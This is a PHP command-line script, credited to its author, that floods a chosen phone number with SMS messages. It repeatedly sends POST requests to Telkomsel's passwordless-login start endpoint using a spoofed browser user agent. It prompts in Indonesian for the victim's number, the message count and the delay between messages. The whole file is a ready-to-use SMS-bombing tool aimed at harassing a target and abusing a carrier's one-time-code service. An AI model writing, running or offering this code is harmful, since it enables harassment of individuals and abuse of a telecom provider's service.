<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
system('clear');


echo "\n\n\n";
echo "\033[31;1m...::::::::[ Created by : Zaa Eka Gumilar ]::::::::...\n";

echo "\033[32;1m----------------------------------------------------\n";
echo "\033[00;3mNote :
Pastikan Nomor target adalah TELKOMSEL.. 
Pastikan anda memiliki koneksi internet..\n";
echo "\033[32;1m----------------------------------------------------\n\n";


echo "\033[00;1mMasukan No Target dengan awalan 62 (contoh: 628xxxxx)\n\033[33;1mInput : ";
$nomor = trim(fgets(STDIN));
echo "\033[00;1mJumlah Pesan Yang Akan Dikirim\n\033[33;1mInput : ";
$jumlah = trim(fgets(STDIN));
echo "\033[00;1mJeda pengiriman pesan (Contoh: 10 = 10 detik perpesan)\n\033[33;1mInput : ";
$jeda = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>
